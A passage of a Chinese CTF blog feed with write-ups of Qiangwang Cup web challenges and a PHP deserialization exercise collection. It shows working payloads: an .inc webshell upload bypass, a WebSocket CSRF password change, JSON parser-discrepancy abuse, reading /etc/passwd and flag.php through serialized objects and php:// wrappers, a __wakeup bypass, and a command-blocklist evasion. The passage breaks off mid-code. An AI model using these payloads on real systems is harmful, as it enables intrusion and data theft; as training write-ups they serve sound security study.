class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$blackext</span>)) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;extension error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$imgname</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>()).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;./&quot;</span>.<span class="variable">$imgname</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$userfile</span>, <span class="variable">$imgname</span>);</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;userfile&quot;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$userfile</span>), <span class="title function_ invoke__">time</span>() + <span class="number">3600</span>*<span class="number">10</span>);</span><br><span class="line">            <span class="variable">$msg</span> = <span class="title function_ invoke__">e</span>(<span class="string">&quot;file: <span class="subst">&#123;$imgname&#125;</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$msg</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload failed!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过upload.php我们可以看到站点对于上传文件的type进行了限制，使其只能上传文件类型为“png”、“jpg”、“jpeg”类型的图片，这里通过burp抓包更改文件类型可以轻松绕过，继续往下看站点设置上传文件黑名单，虽然php后缀被完全限制，但是inc文件并没有被限制所以我们创建后缀名为inc的webshell，再将其上传到网站后返回文件名。再以文件名为类名构造序列化内容，代码如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dc5d9256a103b4cea75ff33f974f94e2</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dc5d9256a103b4cea75ff33f974f94e2</span>();</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$p</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将生成的序列化内容与站点原始cookie中的序列化内容进行替换。从而实现命令执行</p><h2 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a><strong>babyweb</strong></h2><p>这道题目的考点为websocket劫持从而进行csrf攻击完成登录管理员账户的目的，站点的功能为互动bot，注册账号登录系统，可以使用bot，在注册账号的时候我尝试注册admin账户，显示账户已存在，从而我们可以确定admin账户存在并且我们要尝试登录admin账户，进入网站后输入help与bot互动发现bot可以以管理员的身份对网站bug进行检测，那我们使用此功能对让bot对设置好修改密码命令的网页进行访问从而实现csrf。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ws</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">var</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;ws://127.0.0.1:8888/bot&quot;</span>);</span><br><span class="line">        <span class="comment">// 连接成功后的回调函数。</span></span><br><span class="line">        ws.onopen = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 发送数据</span></span><br><span class="line">            ws.<span class="title function_ invoke__">send</span>(<span class="string">&quot;changepw 123456&quot;</span>)</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 调用方法</span></span><br><span class="line">    <span class="title function_ invoke__">ws</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>进入之后是购买界面，使用仅有的200购买到hint，得到网站源码，根据网站源码中python和go对于json获取数据的差异(python对于同名获取后面，go获取前面)，构造payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;product&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="string">&quot;num&quot;</span><span class="punctuation">,</span><span class="number">0</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">2</span><span class="punctuation">,</span><span class="attr">&quot;num&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="string">&quot;num:2&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>python控制购买的数量但不会识别钱数，go识别钱数但不回对购买数量进行限制所以可以使用第一个为0来让go识别为花费0*1000从而实现购买</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​	在博客上记录一下强网杯两道做出的web题目的详细解析，因为题目已经关闭，所以只能通过源码加解释的方法对题目进行解析，我会尽量解析的比较细致。&lt;/p&gt;
&lt;h2 id=&quot;rcefile&quot;&gt;&lt;a href=&quot;#rcefile&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    
    <category term="CTF Writeup" scheme="http://www.beigui.xyz/tags/CTF-Writeup/"/>
    
  </entry>
  
  <entry>
    <title>强国杯WP</title>
    <link href="http://www.beigui.xyz/2022/07/20/qiangguobeiwp/"/>
    <id>http://www.beigui.xyz/2022/07/20/qiangguobeiwp/</id>
    <published>2022-07-20T08:27:24.000Z</published>
    <updated>2022-09-17T09:16:49.497Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220720171330.png" alt="image-20220720171329918"></p><p><a href="https://note.youdao.com/web/#/file/recent/note/WEBcd9fa5ea13879c0a30923e5be08e3fa5/">有道云笔记 (youdao.com)</a></p><p>强国杯初赛最终排名全国第17.也是顺利的进入了半决赛，校队的WP链接放在这作为保存备份</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220720171330.png&quot; alt=&quot;image-20220720171329918&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;ht</summary>
      
    
    
    
    
    <category term="CTF Writeup" scheme="http://www.beigui.xyz/tags/CTF-Writeup/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化的N道例题(持续更新)</title>
    <link href="http://www.beigui.xyz/2022/06/23/php-unserialize/"/>
    <id>http://www.beigui.xyz/2022/06/23/php-unserialize/</id>
    <published>2022-06-23T01:07:43.000Z</published>
    <updated>2023-03-12T13:00:09.553Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在刷题过程中发现对PHP反序列化的理解还不够深刻，对于其如何通过序列化的漏洞达到执行恶意代码的过程不够清晰，于是我将遇到的PHP反序列化题目整理到这篇文章中，后续将会持续更新</p><p>如果对php反序列化的概念还不了解，可以看我之前的文章<a href="https://www.beigui.xyz/2021/03/01/Unserialization/">PHP中的反序列化 | 北轨的博客 (beigui.xyz)</a></p><h1 id="第一题-反序列化和文件包含的简单结合"><a href="#第一题-反序列化和文件包含的简单结合" class="headerlink" title="第一题 反序列化和文件包含的简单结合"></a>第一题 反序列化和文件包含的简单结合</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 第一部分 包含flag.php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="comment">#第二部分 创建connection类并传递file参数</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;sleep.txt&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#接受get传递的un参数，并将其反序列化</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;un&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$obj2</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;un&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据我添加的注释可以看到代码大体可以分为三个部分，而问题的关键在于我们通过反序列化的方式将数据传递到connection类中的file参数从而实现文件包含。我们本地先创建一个使用与connection相同结构的类，创建序列化数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;/etc/passwd&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">Connection</span>();</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$p</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">#代码执行结果序列化数据 O:10:&quot;Connection&quot;:1:&#123;s:4:&quot;file&quot;;s:11:&quot;/etc/passwd&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>我们将&#x2F;etc&#x2F;passwd通过反序列化赋值到file之中，从而验证是否存在文件包含漏洞，根据回显结果证明确实存在漏洞</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220623094244.png" alt="image-20220623094237826"></p><p>将参数改为<strong>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</strong>从而使用php伪协议，尝试读取flag.php源码，并成功读取</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220623094528.png" alt="image-20220623094528375"></p><p>base64解码得到flag</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220623094605.png" alt="image-20220623094605213"></p><h1 id="第二题-wakeup函数绕过"><a href="#第二题-wakeup函数绕过" class="headerlink" title="第二题 __wakeup函数绕过"></a>第二题 __wakeup函数绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;sleep.txt&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;wakeup.txt&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;un&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$obj2</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;un&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目与上道题目非常相似，区别在于使用__wakeup这个魔法函数，此函数的作用是将<strong>在执行unserialize()时，先会调用这个函数</strong>，所以我们使用上一道题目的payload执行是回显示wakeup.txt文档中的内容，使用CVE-2016-7124进行绕过，可以参考<a href="https://blog.csdn.net/qin9800/article/details/113953954">这篇文章</a>理解这个漏洞。成功绕过魔术方法读取flag.php源码。</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220623100043.png" alt="image-20220623100043463"></p><h2 id="第三题-反序列化和file-get-contents"><a href="#第三题-反序列化和file-get-contents" class="headerlink" title="第三题 反序列化和file_get_contents()"></a>第三题 反序列化和file_get_contents()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">#第一部分 包含flag.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="comment">#第二部分 使用Flag类，并将读取file参数传递过去的文件名的内容</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">&quot;good&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 第三部分 接受txt参数和password参数</span></span><br><span class="line"><span class="variable">$txt</span> = <span class="variable">$_GET</span>[<span class="string">&quot;txt&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$txt</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$txt</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the tctf&quot;</span>)&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello friend!&lt;br&gt;&quot;</span>;    </span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$password</span>;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;something wrong! try it again&quot;</span>;  </span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>要想得到flag值–&gt;需要读flag.php页面的源码</p></li><li><p>要想读flag.php页面的源码–&gt;需要执行file_get_contents($this-&gt;file)（很明显，需要执行该函数，且file属性值为flag.php）</p></li><li><p>要想执行file_get_contents($this-&gt;file)函数–&gt;需要执行tostring魔术方法</p></li><li><p>要想执行tostring魔术方法–&gt;需要当前类的实例化对象被当做字符串处理</p></li><li><p>要想当前类的实例化对象被当做字符串处理–&gt;需要执行p a s s w o r d &#x3D; u n s e r i a l i z e ( password &#x3D; unserialize(password&#x3D;unserialize(password);echo $password;</p></li><li><p>要想执行上一步的代码–&gt;需要对传入的txt参数进行绕过过滤</p></li><li><p>要想绕过过滤–&gt;需要给txt传入php:&#x2F;&#x2F;input伪协议，同时以POST形式提交数据welcome to the aegis</p></li></ul>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123; </span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&#x27;flag.php&#x27;</span>;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$chen</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$chen</span>);</span><br><span class="line"><span class="comment">//序列化字符串结果：O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br><span class="line"><span class="comment">//以GET形式提交的数据：?txt=php://input&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br><span class="line"><span class="comment">//同时以POST提交的数据：welcome to the tctf</span></span><br></pre></td></tr></table></figure><p>  <img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220623102337.png" alt="image-20220623102337236"></p><h1 id="bugku题目-安慰奖"><a href="#bugku题目-安慰奖" class="headerlink" title="bugku题目 安慰奖"></a>bugku题目 安慰奖</h1><p><strong>知识点：wake_uph函数绕过以及private属性被序列化的时候属性值会变成%00类名%00属性名,根据规则进行修改</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!-- YmFja3Vwcw== --&gt;&quot;</span>; <span class="comment">#base64解码，backups</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span> = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cmd</span> = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            <span class="variable">$a</span> = `<span class="variable language_">$this</span>-&gt;cmd`;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;给你个安慰奖吧，hhh！&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看懂题目中构建了class类为ctf其中构造了三个函数，当参数传递到类当中是回执行wake_up函数将username&#x3D;&#x3D;guest，使__destruct中的条件无法满足，所以我们需要绕过wake_up函数，另外对于protected创建的变量需要对其进行url编码才能使其空白字符可见，从而完成反序列化操作，使用tac函数便可绕过preg_match函数实现读取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#poc</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cmd</span>=<span class="string">&#x27;tac flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$p</span> = <span 